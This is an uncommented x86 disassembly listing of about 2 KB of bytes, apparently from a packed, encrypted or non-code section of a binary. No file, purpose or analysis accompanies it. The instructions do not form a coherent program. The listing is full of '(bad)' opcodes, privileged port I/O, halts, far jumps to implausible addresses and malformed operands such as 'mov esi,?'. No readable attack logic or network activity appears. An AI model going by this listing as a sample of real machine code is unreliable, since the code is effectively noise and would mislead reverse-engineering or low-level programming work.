  405fae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405faf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fb0:	xchg   edx,eax
  405fb1:	jbe    0x40600d
  405fb3:	or     DWORD PTR [esi-0xea61939],esi
  405fb9:	repz jbe 0x405f40
  405fbc:	ds pop ss
  405fbe:	xor    BYTE PTR [edi+0x6603737d],dh
  405fc4:	add    dl,BYTE PTR [ebx+0x47]
  405fc7:	out    dx,al
  405fc8:	in     al,0xcc
  405fca:	sti    
  405fcb:	and    bh,BYTE PTR [eax-0x1]
  405fce:	mov    esi,0xea191205
  405fd3:	das    
  405fd4:	clc    
  405fd5:	rol    DWORD PTR [esi+0x22],cl
  405fd8:	(bad)  
  405fd9:	push   esi
  405fda:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fdc:	and    BYTE PTR [ebx],0x9e
  405fdf:	pusha  
  405fe0:	push   0xffffffcb
  405fe2:	push   es
  405fe3:	mov    ch,0x5d
  405fe5:	les    esi,FWORD PTR [ebp+0x47]
  405fe8:	adc    bh,dl
  405fea:	jp     0x405feb
  405fec:	pop    edi
  405fed:	mov    esi,0x50b91eb7
  405ff2:	std    
  405ff3:	fs jb  0x405fdf
  405ff6:	jmp    0x405ffa
  405ff8:	add    BYTE PTR [eax],al
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	mov    BYTE PTR [ecx],bh
  406008:	stc    
  406009:	pop    ecx
  40600a:	mov    edx,eax
  40600c:	js     0x406086
  40600e:	dec    ebp
  40600f:	jle    0x406089
  406011:	js     0x406002
  406013:	sub    eax,0xe0cd9b93
  406018:	xor    ecx,ebx
  40601a:	in     eax,dx
  40601b:	hlt    
  40601c:	or     eax,0x6cf6d334
  406021:	inc    edx
  406022:	call   DWORD PTR [ebx]
  406024:	lock mov BYTE PTR cs:[edi],bh
  406028:	retf   
  406029:	fcmovbe st,st(0)
  40602b:	xor    edx,DWORD PTR [ecx-0xc]
  40602e:	(bad)  
  40602f:	dec    edi
  406030:	mov    eax,ds:0xa8d0995d
  406035:	push   ebx
  406036:	pop    edx
  406037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406038:	(bad)  
  406039:	xchg   ebp,eax
  40603a:	xchg   esp,eax
  40603b:	leave  
  40603c:	mov    fs,WORD PTR [ebx]
  40603e:	inc    esp
  40603f:	sbb    ah,BYTE PTR [ebx+0x5da72b9]
  406045:	mov    al,0xc
  406047:	inc    esp
  406048:	ins    DWORD PTR es:[edi],dx
  406049:	retf   
  40604a:	(bad)  
  40604b:	or     ecx,DWORD PTR [edx]
  40604d:	mov    ds:0x72a5913a,al
  406052:	pop    esi
  406053:	push   0x5a
  406055:	je     0x405ff4
  406057:	sub    eax,0x54f8009f
  40605c:	call   0xa283bfdb
  406061:	dec    ecx
  406062:	aam    0x34
  406064:	xor    DWORD PTR [ebx+0x6117eb42],0xffffff83
  40606b:	adc    DWORD PTR [ebp+0x20],ebx
  40606e:	out    dx,al
  40606f:	xor    edi,esi
  406071:	push   ebp
  406072:	bnd jbe 0x40608d
  406075:	cmc    
  406076:	adc    ebx,edi
  406078:	mov    esp,0xf34181c4
  40607d:	test   DWORD PTR [ecx+edi*8-0x451c7036],0x2c43a946
  406088:	ret    0x9b43
  40608b:	add    eax,0xef3f1a2d
  406090:	leave  
  406091:	or     al,0x24
  406093:	scas   eax,DWORD PTR es:[edi]
  406094:	mov    edx,ecx
  406096:	jne    0x4060b3
  406098:	pop    es
  406099:	(bad)  
  40609a:	mov    ds:0x869160bb,eax
  40609f:	sbb    ebx,DWORD PTR [eax+eiz*4]
  4060a2:	je     0x40608a
  4060a4:	retf   0x31b5
  4060a7:	lods   eax,DWORD PTR ds:[esi]
  4060a8:	cld    
  4060a9:	data16 fmul QWORD PTR [ecx-0x59]
  4060ad:	int3   
  4060ae:	xor    bh,BYTE PTR [esi]
  4060b0:	test   BYTE PTR [edi],bh
  4060b2:	arpl   bp,si
  4060b4:	pushf  
  4060b5:	mov    edi,0xa2b30511
  4060ba:	mov    edi,0x462afeac
  4060bf:	jmp    0xff65:0x1e019c8
  4060c6:	jne    0x4060bd
  4060c8:	xchg   esp,eax
  4060c9:	xchg   esp,eax
  4060ca:	jg     0x4060b1
  4060cc:	mov    esi,0x579c7a5f
  4060d1:	mov    ch,0x3f
  4060d3:	xor    esi,DWORD PTR [eax]
  4060d5:	sti    
  4060d6:	dec    esp
  4060d7:	dec    ebp
  4060d8:	mov    eax,ds:0x99935507
  4060dd:	not    DWORD PTR [ecx+ebx*4+0x66]
  4060e1:	call   0x64441b17
  4060e6:	repz mov al,0xcb
  4060e9:	or     al,0x29
  4060eb:	cmp    BYTE PTR [edx+0x4ff34d8d],al
  4060f1:	rcl    DWORD PTR [ebp+edi*4-0x4be1f1dd],0x94
  4060f9:	xchg   ebp,eax
  4060fa:	push   edi
  4060fb:	push   ebx
  4060fc:	shr    al,0x15
  4060ff:	xchg   esi,eax
  406100:	in     al,dx
  406101:	sub    esi,ecx
  406103:	xchg   edx,eax
  406104:	fcmovnu st,st(4)
  406106:	loop   0x406145
  406108:	mul    DWORD PTR [eax]
  40610a:	inc    esp
  40610b:	or     al,0xa0
  40610d:	cmp    ah,BYTE PTR [edx-0x22bba872]
  406113:	push   eax
  406114:	fistp  DWORD PTR [ebx+0x7b6b373b]
  40611a:	stos   BYTE PTR es:[edi],al
  40611b:	(bad)  
  40611c:	pop    eax
  40611d:	or     cl,BYTE PTR [edi+ebp*1+0x41543f5e]
  406124:	cmp    eax,0x4b6c345b
  406129:	pop    ecx
  40612a:	je     0x406175
  40612c:	fcom   QWORD PTR [edi+ebx*4]
  40612f:	and    al,0x15
  406131:	pop    ss
  406132:	fist   DWORD PTR [edx-0x45]
  406135:	in     eax,0xbf
  406137:	repnz aad 0xb9
  40613a:	or     DWORD PTR [edx+0x77],0x6bf6248c
  406141:	mov    esp,0xf02d4e80
  406146:	xchg   esi,eax
  406147:	sbb    esi,0x378a5390
  40614d:	push   edi
  40614e:	jg     0x406171
  406150:	sub    BYTE PTR [ebx-0x45bd107b],dh
  406156:	call   0xc19c:0xff6d0aa9
  40615d:	pop    edi
  40615e:	mov    edi,0x95028d86
  406163:	jp     0x40614a
  406165:	aam    0x3f
  406167:	repz dec esp
  406169:	lds    esp,FWORD PTR [edx+0xb6088fb]
  40616f:	stc    
  406170:	cld    
  406171:	push   esp
  406172:	mov    ebx,0xbf5cd594
  406177:	jecxz  0x4061a5
  406179:	cmp    DWORD PTR [ecx+0x8b3fde],ebx
  40617f:	xchg   DWORD PTR [ebx+0xd],eax
  406182:	inc    esp
  406183:	xor    bh,dl
  406185:	sti    
  406186:	addr16 pop esp
  406188:	shr    DWORD PTR [eax+0x1a],1
  40618b:	bound  edx,QWORD PTR [edx-0x283af9ce]
  406191:	out    0xf2,al
  406193:	jge    0x406159
  406195:	mov    ds:0xbb909e38,eax
  40619a:	iret   
  40619b:	fstp   DWORD PTR [eax+0x6c]
  40619e:	loop   0x4061fa
  4061a0:	dec    dl
  4061a2:	pop    ebp
  4061a3:	retf   0x78d4
  4061a6:	fcomip st,st(6)
  4061a8:	lea    esi,[bx+di-0x52c2]
  4061ad:	int    0xb9
  4061af:	test   DWORD PTR [eax+0x3e],0x2c67eb47
  4061b6:	mov    dl,0xb4
  4061b8:	ret    
  4061b9:	mov    DWORD PTR [ecx-0x354f648],0x1dd62412
  4061c3:	push   edi
  4061c4:	cs cmp dh,al
  4061c7:	push   eax
  4061c8:	test   al,0x9d
  4061ca:	daa    
  4061cb:	test   edi,eax
  4061cd:	jg     0x406155
  4061cf:	jg     0x406246
  4061d1:	les    edx,FWORD PTR [esp+ebx*4+0x43b0df46]
  4061d8:	nop
  4061d9:	jmp    0xb4153922
  4061de:	fiadd  WORD PTR [eax+ebp*1-0x7e]
  4061e2:	cdq    
  4061e3:	fsub   DWORD PTR [ebx-0x4abd6c7]
  4061e9:	arpl   WORD PTR [eax],cx
  4061eb:	mov    DWORD PTR [ebx-0x4487d28c],edx
  4061f1:	and    DWORD PTR ds:0x237254cc,esp
  4061f7:	dec    edi
  4061f8:	mov    ch,0xb1
  4061fa:	and    DWORD PTR [eax+0x663dc2fd],0xc3405d71
  406204:	stos   DWORD PTR es:[edi],eax
  406205:	enter  0x895f,0xad
  406209:	xor    eax,0x463f833b
  40620e:	sbb    DWORD PTR [edi-0x192f7d4a],edi
  406214:	in     eax,dx
  406215:	sbb    BYTE PTR [ebx],ch
  406217:	or     eax,0x5be93218
  40621c:	sub    DWORD PTR [edi-0x43],ebp
  40621f:	lea    esp,[ecx+edi*4-0x78]
  406223:	loop   0x4061b7
  406225:	push   0x3f
  406227:	mov    ds:0x5f7f801a,eax
  40622c:	rcl    BYTE PTR [ebx-0x66d71767],0x46
  406233:	call   0xa9cf:0xb28093ea
  40623a:	in     eax,dx
  40623b:	sub    ch,BYTE PTR [esp+0x31fb677e]
  406242:	stc    
  406243:	or     BYTE PTR [ebx+0x402b4cab],bh
  406249:	(bad)  
  40624a:	jne    0x406221
  40624c:	dec    edi
  40624d:	retf   
  40624e:	mov    bh,BYTE PTR [ecx+0x19505c1e]
  406254:	xor    al,0x8e
  406256:	repnz inc edi
  406258:	clc    
  406259:	or     al,0xd
  40625b:	stos   BYTE PTR es:[edi],al
  40625c:	test   ax,0xfbbd
  406260:	xchg   ecx,eax
  406261:	test   eax,0x4a1acfdf
  406266:	and    al,0x4a
  406268:	mov    eax,ds:0xb5c19a9f
  40626d:	jmp    0x406291
  40626f:	mov    ds:0x3ed37944,eax
  406274:	jle    0x406275
  406276:	imul   ecx,DWORD PTR [ecx-0x46],0x1b
  40627a:	dec    edi
  40627b:	arpl   di,di
  40627d:	dec    ecx
  40627e:	ja     0x4062cc
  406280:	retf   0xd4bf
  406283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406284:	scas   eax,DWORD PTR es:[edi]
  406285:	mov    al,0xf3
  406287:	loope  0x406289
  406289:	sbb    DWORD PTR [edx-0x4d4884f3],esi
  40628f:	xchg   edx,eax
  406290:	sub    eax,0x2196b483
  406295:	lds    ebp,FWORD PTR [ecx+edi*1]
  406298:	daa    
  406299:	ja     0x406317
  40629b:	lahf   
  40629c:	mov    bl,0x16
  40629e:	(bad)  
  40629f:	loop   0x4062af
  4062a1:	jecxz  0x40630f
  4062a3:	das    
  4062a4:	jnp    0x4062f8
  4062a6:	mov    ah,0x51
  4062a8:	jnp    0x40631c
  4062aa:	xchg   esp,eax
  4062ab:	addr16 mov eax,ds:0xdce1
  4062af:	sub    al,0x62
  4062b1:	xor    BYTE PTR [eax],ch
  4062b3:	fwait
  4062b4:	lahf   
  4062b5:	or     edi,ebp
  4062b7:	je     0x40631b
  4062b9:	lock xor eax,0xe028fd1a
  4062bf:	les    edx,FWORD PTR [ebp+0x35]
  4062c2:	jp     0x4062ff
  4062c4:	fstp   TBYTE PTR fs:[eax]
  4062c7:	rol    BYTE PTR [ecx-0x51a56597],cl
  4062cd:	mov    ds:0x6b635561,al
  4062d2:	int3   
  4062d3:	in     al,dx
  4062d4:	cmp    BYTE PTR [esi-0x7de4ad8],ah
  4062da:	mov    esp,0xe145320d
  4062df:	aaa    
  4062e0:	leave  
  4062e1:	lahf   
  4062e2:	cli    
  4062e3:	jns    0x406269
  4062e5:	div    ecx
  4062e7:	mov    ecx,DWORD PTR [ebp+0x10]
  4062ea:	jmp    0x4065da
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0x99c07a5c
  4062fe:	jb     0x4062de
  406300:	(bad)  
  406301:	js     0x40637b
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x40630f
  406308:	xchg   ebx,eax
  406309:	adc    DWORD PTR [ecx+ecx*1+0x15],ebx
  40630d:	outs   dx,DWORD PTR ds:[esi]
  40630e:	out    0x37,al
  406310:	push   0xffffffb5
  406312:	repz (bad) 
  406314:	shr    BYTE PTR [ebx+0x3f],1
  406317:	mov    ds:0xc88cabba,al
  40631c:	sbb    ebp,0x76
  40631f:	aad    0x1d
  406321:	hlt    
  406322:	mov    ecx,0x8008eb55
  406327:	add    edx,DWORD PTR [edi-0x7a84e44c]
  40632d:	cmp    al,0xa3
  40632f:	xor    eax,0xec132ffb
  406334:	fs jp  0x40630f
  406337:	leave  
  406338:	sar    DWORD PTR [ebx],cl
  40633a:	pop    edi
  40633b:	lods   al,BYTE PTR ds:[esi]
  40633c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40633d:	imul   eax,DWORD PTR [ebp-0x2c357c66],0xffffff9e
  406344:	pop    esp
  406345:	rcl    BYTE PTR [eax+0xb],cl
  406348:	out    0x24,al
  40634a:	push   ebx
  40634b:	add    eax,0x659cbc20
  406350:	sbb    DWORD PTR [ebp+ebp*4+0x54],edi
  406354:	add    ebp,DWORD PTR [esp+esi*2-0x388e32dd]
  40635b:	retf   
  40635c:	sub    esp,DWORD PTR [ebp-0x20a98d7]
  406362:	mov    eax,ds:0xcf4d632b
  406367:	hlt    
  406368:	jae    0x4063a3
  40636a:	jnp    0x406332
  40636c:	push   esp
  40636d:	ret    0x9a5a
  406370:	test   dh,bl
  406372:	and    eax,0xce87b97c
  406377:	leave  
  406378:	pushf  
  406379:	mov    cl,BYTE PTR [ebx-0x3d]
  40637c:	loop   0x40630b
  40637e:	mov    dh,0x64
  406380:	addr16 and al,0xfd
  406383:	(bad)  
  406384:	xor    bl,al
  406386:	inc    esp
  406387:	stos   DWORD PTR es:[edi],eax
  406388:	lds    edi,FWORD PTR [ecx]
  40638a:	ins    DWORD PTR es:[edi],dx
  40638b:	push   ss
  40638c:	popf   
  40638d:	loop   0x4063e4
  40638f:	int    0x90
  406391:	(bad)  
  406393:	pop    edi
  406394:	xlat   BYTE PTR ds:[ebx]
  406395:	fcom   st(3)
  406397:	add    eax,0xdbe69570
  40639c:	push   ebx
  40639d:	push   es
  40639e:	inc    esp
  40639f:	jns    0x4063ce
  4063a1:	sbb    dh,BYTE PTR [esi-0x7cee65be]
  4063a7:	xchg   ebx,eax
  4063a8:	cmc    
  4063a9:	or     ah,dh
  4063ab:	addr16 nop
  4063ad:	icebp  
  4063ae:	xchg   cl,dh
  4063b0:	adc    bh,BYTE PTR [edi-0x58]
  4063b3:	aad    0xfe
  4063b5:	stos   DWORD PTR es:[edi],eax
  4063b6:	les    eax,FWORD PTR [edi+0x5f430a44]
  4063bc:	bound  edi,QWORD PTR ss:[ebp+0x45]
  4063c0:	jmp    0xfc8e:0x677b142c
  4063c7:	fiadd  WORD PTR [esi]
  4063c9:	test   al,0x73
  4063cb:	xchg   esp,eax
  4063cc:	push   0x2b782f4b
  4063d1:	inc    dx
  4063d3:	or     eax,0x1af01aa5
  4063d8:	outs   dx,BYTE PTR ds:[esi]
  4063d9:	xchg   ecx,eax
  4063da:	fcmovnu st,st(2)
  4063dc:	jmp    0x6cf1a942
  4063e1:	test   al,0x23
  4063e3:	pushf  
  4063e4:	mov    al,0x16
  4063e6:	jp     0x406428
  4063e8:	stos   BYTE PTR es:[edi],al
  4063e9:	push   ebp
  4063ea:	jp     0x40640a
  4063ec:	clc    
  4063ed:	adc    dh,BYTE PTR [esi]
  4063ef:	xor    cl,BYTE PTR [edi]
  4063f1:	adc    eax,0x33654f6c
  4063f6:	out    dx,al
  4063f7:	add    eax,0x13324c3e
  4063fc:	cmp    esp,DWORD PTR [ebx+0x1d]
  4063ff:	adc    edi,edx
  406401:	addr16 aad 0x57
  406404:	jl     0x406435
  406406:	xor    ebx,edx
  406408:	pop    DWORD PTR [edx+0x44]
  40640b:	aaa    
  40640c:	inc    ecx
  40640d:	das    
  40640e:	adc    DWORD PTR [ebx-0x5],ecx
  406411:	je     0x40640e
  406413:	bound  esi,QWORD PTR [edx]
  406415:	inc    ebp
  406416:	inc    ebx
  406417:	sti    
  406418:	cdq    
  406419:	popa   
  40641a:	jae    0x406413
  40641c:	xchg   ecx,eax
  40641d:	clc    
  40641e:	jl     0x40643a
  406420:	fs adc eax,0x9322f921
  406426:	test   eax,0xd7ed6e9e
  40642b:	mov    ah,0xc1
  40642d:	or     eax,0xd4ab9601
  406432:	outs   dx,DWORD PTR ds:[esi]
  406433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406434:	add    eax,0x774f590
  406439:	mov    dh,bl
  40643b:	paddw  mm4,mm3
  40643e:	nop
  40643f:	mov    dl,0x58
  406441:	sub    DWORD PTR [esi+ebp*4+0x466d36b5],esp
  406448:	aas    
  406449:	fwait
  40644a:	addr16 jge 0x4063f6
  40644d:	sub    dh,BYTE PTR [edi+0x5f]
  406450:	mov    DWORD PTR [edx+0x66],edx
  406453:	push   0x322bdc05
  406458:	mov    ss,WORD PTR [eax]
  40645a:	je     0x406478
  40645c:	jecxz  0x406451
  40645e:	jns    0x406493
  406460:	mov    WORD PTR [eax+0x6c],ss
  406463:	mov    ebp,0x3a2dd0d2
  406468:	push   edi
  406469:	loope  0x406412
  40646b:	adc    bh,dh
  40646d:	xchg   bl,al
  40646f:	xor    bl,bl
  406471:	bound  esp,QWORD PTR [eax]
  406473:	mov    eax,ds:0xaa9d0146
  406478:	or     al,al
  40647a:	xchg   edi,eax
  40647b:	out    dx,al
  40647c:	jp     0x406453
  40647e:	inc    ebx
  40647f:	sub    edi,edi
  406481:	sbb    ebx,DWORD PTR [eax-0x1d]
  406484:	je     0x406475
  406486:	mov    eax,0x5f81d7e1
  40648b:	(bad)
  40648e:	jno    0x4064c0
  406490:	xor    al,0x32
  406492:	jne    0x406483
  406494:	aad    0x22
  406496:	gs mov bl,0x8d
  406499:	adc    bl,bh
  40649b:	cdq    
  40649c:	arpl   WORD PTR [edx+0x5d],di
  40649f:	ret    0x3399
  4064a2:	pop    ebx
  4064a3:	es cli 
  4064a5:	ins    BYTE PTR es:[edi],dx
  4064a6:	pop    esi
  4064a7:	enter  0xd476,0x2a
  4064ab:	ja     0x406466
  4064ad:	cmc    
  4064ae:	call   0x1814ae99
  4064b3:	aad    0x6
  4064b5:	mov    cl,0x40
  4064b7:	cld    
  4064b8:	mov    al,BYTE PTR [esi+0xceffd93]
  4064be:	sar    BYTE PTR [esp+esi*8],cl
  4064c1:	in     al,0xef
  4064c3:	inc    edx
  4064c4:	mov    cl,0xe8
  4064c6:	sub    ah,BYTE PTR [esi+edi*8]
  4064c9:	out    dx,al
  4064ca:	test   al,0xef
  4064cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064cd:	xor    al,0xa3
  4064cf:	daa    
  4064d0:	cli    
  4064d1:	clc    
  4064d2:	call   0x1f55:0x5c31c2e4
  4064d9:	mov    esi,0x6d7162eb
  4064de:	fs add al,0x23
  4064e1:	push   0xfb2367a1
  4064e6:	mov    ebx,0x8a7784e0
  4064eb:	scas   eax,DWORD PTR es:[edi]
  4064ec:	or     al,0x26
  4064ee:	jmp    0xb445:0x4dd570df
  4064f5:	xor    BYTE PTR [edi+0x1c],al
  4064f8:	cmp    BYTE PTR [esi+eax*1+0x724b10a7],ch
  4064ff:	pusha  
  406500:	push   ss
  406501:	pop    ss
  406502:	adc    ch,cl
  406504:	retf   
  406505:	jns    0x786ed882
  40650b:	cmp    eax,0x88442847
  406510:	sbb    cl,BYTE PTR [ecx+ebp*8-0x6d3abfbb]
  406517:	push   cs
  406518:	scas   eax,DWORD PTR es:[di]
  40651a:	das    
  40651b:	jb     0x406523
  40651d:	cli    
  40651e:	xchg   edx,eax
  40651f:	xchg   edx,eax
  406520:	mov    esi,?
  406522:	imul   eax,DWORD PTR [edi+eax*1+0x30],0xffffffa7
  406527:	lea    ebx,[edx-0x4]
  40652a:	popa   
  40652b:	mov    dh,0x8e
  40652d:	push   0xffffffa9
  40652f:	aaa    
  406530:	aad    0x71
  406532:	js     0x406583
  406534:	fcmovnbe st,st(3)
  406536:	sub    al,0x32
  406538:	dec    ecx
  406539:	mov    bl,bl
  40653b:	mov    ch,0xb3
  40653d:	pop    eax
  40653e:	rcr    dl,cl
  406540:	outs   dx,DWORD PTR ds:[esi]
  406541:	sub    DWORD PTR [eax+0x19cefc64],eax
  406547:	sub    ebx,DWORD PTR [ecx]
  406549:	idiv   DWORD PTR [eax+0x54]
  40654c:	out    dx,eax
  40654d:	lea    edi,[edx]
  40654f:	sbb    BYTE PTR [eax+0x2d],al
  406552:	mov    edi,DWORD PTR [eax-0x6c22cb45]
  406558:	je     0x4064fc
  40655a:	mov    esp,0x3ea2aef4
  40655f:	xor    esi,DWORD PTR [ecx+0x3cacd8be]
  406565:	or     eax,0x7abe9f76
  40656a:	scas   al,BYTE PTR es:[edi]
  40656b:	push   ds
  40656c:	mov    ebx,DWORD PTR ds:0x4ea7a9da
  406572:	popf   
  406573:	in     al,0x80
  406575:	stc    
  406576:	add    DWORD PTR [eax+edx*2-0x20b807df],ebx
  40657d:	daa    
  40657e:	dec    edx
  40657f:	xchg   ecx,eax
  406580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406581:	mov    dl,0xea
  406583:	inc    ebx
  406584:	loop   0x406523
  406586:	ror    edi,cl
  406588:	das    
  406589:	mov    eax,ds:0x1fde8f48
  40658e:	popa   
  40658f:	sbb    al,0xc6
  406591:	aam    0x15
  406593:	mov    ds:0xa0982172,al
  406598:	push   edx
  406599:	push   eax
  40659a:	js     0x406555
  40659c:	(bad)  
  40659d:	imul   edi,edi,0xffffffea
  4065a0:	push   esp
  4065a1:	sbb    al,0xdf
  4065a3:	sti    
  4065a4:	dec    ebx
  4065a5:	fisubr WORD PTR [ebx]
  4065a7:	ja     0x4065c3
  4065a9:	or     dl,BYTE PTR [ecx-0x16ada971]
  4065af:	inc    eax
  4065b0:	out    dx,eax
  4065b1:	add    al,0x57
  4065b3:	jo     0x40661c
  4065b5:	inc    ebx
  4065b6:	jmp    0x600e29b
  4065bb:	outs   dx,BYTE PTR ds:[esi]
  4065bc:	push   ebx
  4065bd:	mov    ah,0x6d
  4065bf:	pop    esp
  4065c0:	loopne 0x4065be
  4065c2:	mov    WORD PTR ds:0x13e36990,?
  4065c8:	jnp    0x406585
  4065ca:	int3   
  4065cb:	popf   
  4065cc:	mov    dh,0xcf
  4065ce:	cmp    al,0x51
  4065d0:	fcomp  st(6)
  4065d2:	or     al,0x10
  4065d4:	jne    0x406644
  4065d6:	mov    ebp,0x232653d5
  4065db:	enter  0xc981,0x8e
  4065df:	sbb    eax,0xc18b8116
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	sti    
  4065f6:	idiv   DWORD PTR [ebx-0x35]
  4065f9:	xor    eax,esp
  4065fb:	js     0x406675
  4065fd:	dec    ebp
  4065fe:	jle    0x406678
  406600:	js     0x406673
  406602:	jb     0x40660a
  406604:	push   ecx
  406605:	out    0xfb,eax
  406607:	ds push ecx
  406609:	sbb    al,0xdf
  40660b:	loop   0x4065e1
  40660d:	fisubr DWORD PTR [ebx+0xb0c1821]
  406613:	sahf   
  406614:	add    eax,0xdda39078
  406619:	pusha  
  40661a:	fist   WORD PTR [ecx+0x1b55f361]
  406620:	cs mov ch,0x21
  406623:	rcl    DWORD PTR [esi],cl
  406625:	fisttp WORD PTR [edi]
  406627:	inc    edi
  406628:	retf   0xa02e
  40662b:	cdq    
  40662c:	adc    esp,esp
  40662e:	xor    BYTE PTR [ebx-0x4e],al
  406631:	aam    0xe4
  406633:	push   es
  406634:	cmp    DWORD PTR ds:0x5b0a29ee,ebx
  40663a:	add    al,BYTE PTR ds:0x4763f0bc
  406640:	test   eax,0xbe258a98
  406645:	loope  0x406623
  406647:	mov    edx,0x4e4ab30
  40664c:	xchg   esi,eax
  40664d:	dec    ebp
  40664e:	outs   dx,DWORD PTR ds:[esi]
  40664f:	std    
  406650:	fsubr  DWORD PTR ds:0x27ed756a
  406656:	popf   
  406657:	mov    ds:0x2cd96fdd,al
  40665c:	loopne 0x4066cb
  40665e:	add    ch,BYTE PTR [edx-0x2c]
  406661:	lods   al,BYTE PTR ds:[esi]
  406662:	mov    ebp,0x3d3f5fce
  406667:	in     eax,0x90
  406669:	sub    eax,0xec5f1e05
  40666e:	cs out 0x7d,eax
  406671:	adc    dl,BYTE PTR [ebp-0x1be6fc64]
  406677:	fdivr  st,st(1)
  406679:	inc    edx
  40667a:	call   0xebad:0xfc1d1f54
  406681:	jno    0x40668d
  406683:	pop    ecx
  406684:	fdivr  DWORD PTR [ebx]
  406686:	sub    al,0x56
  406688:	aas    
  406689:	stos   DWORD PTR es:[edi],eax
  40668a:	xchg   BYTE PTR [eax],dh
  40668c:	mov    esp,0x6b850c99
  406691:	xchg   esi,eax
  406692:	leave  
  406693:	pop    esi
  406694:	loope  0x40670c
  406696:	hlt    
  406697:	mov    cl,bh
  406699:	jmp    0x4066ec
  40669b:	xor    bl,BYTE PTR [eax]
  40669d:	ins    BYTE PTR es:[edi],dx
  40669e:	jnp    0x406688
  4066a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066a1:	mov    ebp,0x70e18381
  4066a6:	ss push ebx
  4066a8:	hlt    
  4066a9:	test   eax,0xb0d101b5
  4066ae:	mov    esp,0x63a74757
  4066b3:	mov    DWORD PTR [edi+0x25],edx
  4066b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066b7:	push   edi
  4066b8:	je     0x406717
  4066ba:	imul   ebx,DWORD PTR [edx],0x3f8efa94
  4066c0:	sub    DWORD PTR ds:0xe4a6eec5,esp
  4066c6:	dec    esi
  4066c7:	in     eax,0x27
  4066c9:	arpl   WORD PTR [esi+0x20],si
  4066cc:	(bad)  
  4066ce:	xlat   BYTE PTR ds:[ebx]
  4066cf:	and    eax,DWORD PTR [ebx]
  4066d1:	rcl    BYTE PTR [bx+si+0x7a3f],cl
  4066d6:	xor    DWORD PTR [ebx],ebx
  4066d8:	out    0x88,eax
  4066da:	dec    eax
  4066db:	shl    edi,0x85
  4066de:	xchg   esp,eax
  4066df:	lods   al,BYTE PTR ds:[esi]
  4066e0:	cs and eax,0x4bd2790
  4066e6:	das    
  4066e7:	dec    edx
  4066e8:	sbb    eax,0x6dceafa1
  4066ed:	jecxz  0x406692
  4066ef:	cmp    BYTE PTR [edi-0x4c],0x88
  4066f3:	sub    edx,edi
  4066f5:	loope  0x406714
  4066f7:	sub    al,0x59
  4066f9:	mov    bh,0xd9
  4066fb:	arpl   cx,di
  4066fd:	ins    DWORD PTR es:[edi],dx
  4066fe:	mov    dh,0xee
  406700:	inc    esi
  406701:	rcl    BYTE PTR [edi+0x7e],0xab
  406705:	ja     0x40671f
  406707:	inc    edx
  406708:	xor    BYTE PTR [edi-0x137c368c],dh
  40670e:	push   ds
  40670f:	sub    DWORD PTR [eax+0x793418c4],esp
  406715:	out    dx,al
  406716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406717:	hlt    
  406718:	fisub  DWORD PTR [edi-0x12]
  40671b:	and    ecx,eax
  40671d:	daa    
  40671e:	mov    ds:0xe64ee8d1,eax
  406723:	pop    esp
  406724:	jp     0x406734
  406726:	popa   
  406727:	mov    dh,0x8f
  406729:	push   edx
  40672a:	cmp    DWORD PTR [ebx+0x19506b9c],0xc6ec02d5
  406734:	iret   
  406735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406736:	call   FWORD PTR ss:[edi+0x32]
  40673a:	sub    DWORD PTR [ecx+0x4cc8ae48],esi
  406740:	out    dx,eax
  406741:	xchg   ebx,eax
  406742:	or     esi,ebx
  406744:	gs lahf 
  406746:	into   
  406747:	fdiv   QWORD PTR [edx]
  406749:	push   ss
  40674a:	pop    ss
  40674b:	lahf   
  40674c:	inc    edi
  40674d:	pop    ecx
  40674e:	cmc    
  40674f:	adc    al,BYTE PTR [eax+ebx*1+0x37b2fd11]
  406756:	sbb    al,0x76
  406758:	std    
  406759:	in     al,0x2f
  40675b:	jecxz  0x4067c5
  40675d:	sub    eax,0x7e65d3e3
  406762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406763:	xchg   ecx,eax
  406764:	xchg   edi,eax
  406765:	cmp    bh,bl
  406767:	mov    WORD PTR [ebx+0x7b58c938],ss
  40676d:	scas   al,BYTE PTR es:[edi]
  40676e:	jb     0x40672a
  406770:	or     ebp,esi
  406772:	and    esi,DWORD PTR [edx]
  406774:	add    esi,DWORD PTR [edx+0x2bcaf71a]
  40677a:	fild   WORD PTR [edi+esi*1-0x55a15ded]
  406781:	popa   
  406782:	imul   eax,DWORD PTR ds:0xfb185e8f,0xffffff89
  406789:	out    0xb6,eax
  40678b:	xor    ebx,DWORD PTR [edi+0xf]
  40678e:	and    dl,ah
  406790:	mov    eax,ds:0x8f72c840
  406795:	cdq    
  406796:	call   0xb612:0xc852e9fa
  40679d:	out    dx,eax
  40679e:	ins    BYTE PTR es:[edi],dx
  40679f:	mov    dh,0xeb
  4067a1:	or     al,0xf2
  4067a3:	dec    edi
  4067a4:	out    0x57,al
  4067a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067a8:	(bad)  
  4067a9:	(bad)  
  4067ab:	in     al,0x9f
  4067ad:	jns    0x40677a
  4067af:	mov    ecx,0x73aba682
